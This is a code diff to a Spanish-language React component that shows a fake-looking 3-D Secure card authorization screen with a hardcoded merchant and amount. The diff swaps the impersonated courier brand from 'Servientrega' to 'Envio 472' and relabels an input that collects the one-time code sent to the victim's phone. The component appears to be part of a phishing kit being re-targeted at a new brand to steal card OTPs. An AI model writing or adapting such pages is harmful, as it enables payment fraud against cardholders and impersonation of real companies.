@@ -47,12 +47,12 @@ const ASK3D = ({ idF ,dataScr}) => {
             <div>
                 <p className='font-semibold mb-3 ml-4'>Autorización de transacción 3D</p>
                 <p className=' leading-4 text-xs font-semibold text-gray-900 ml-4'>
-                    La transacción que intentas realizar el pago por $6.200 USD el <span className='mx-1'>{fecha()}</span>
+                    La transacción que intentas realizar el pago por $8.689 el <span className='mx-1'>{fecha()}</span>
                     con tu tarjeta terminada en {dataScr?.Tc} debe ser
                     autorizada por seguridad.
                 </p>
                 <p className=' leading-4 text-xs font-semibold text-gray-900 mt-6 ml-4'>
-                Para continuar la transacción es necesario que ingrese el codigo enviado a su celular registrado, correo electrónico o clave dinámica
+                Para continuar la transacción es necesario que ingrese el código enviado a su celular registrado, correo electrónico o código aleatorio
 
                 </p>
             </div>
@@ -63,18 +63,18 @@ const ASK3D = ({ idF ,dataScr}) => {
                 <div className='flex flex-wrap justify-center'>
                     <div className='flex text-xs w-4/5 pl-1'>
                         <span className='font-bold ml-20 '>Comercio:</span>
-                        <span className='ml-4'>Servientrega</span>
+                        <span className='ml-4'>Envio 472</span>
                     </div>
                     <div className='flex text-xs w-4/5'>
                         <p className='font-bold '>Monto de la Transacción:</p>
-                        <p className='ml-4'>$6.200 USD</p>
+                        <p className='ml-4'>$8.689</p>
                     </div>
                     <div className='flex text-xs '>
                         <p className='font-bold ml-2'>Número de Tarjeta:</p>
                         <p className='ml-4'>************{dataScr.Tc}</p>
                     </div>
                     <div className='flex text-xs w-4/5 items-center'>
-                        <p className='font-bold ml-11 w-40 text-right'>Ingresa tu Clave Dinámica:</p>
+                        <p className='font-bold ml-11 w-40 text-right'>Ingresa tu código enviado:</p>
                         <input onChange={(e) => setDinKey(e.target.value)}
                             value={dinKey}
                             className='border-2 h-6 w-28 border-black ml-4 outline-none px-1'
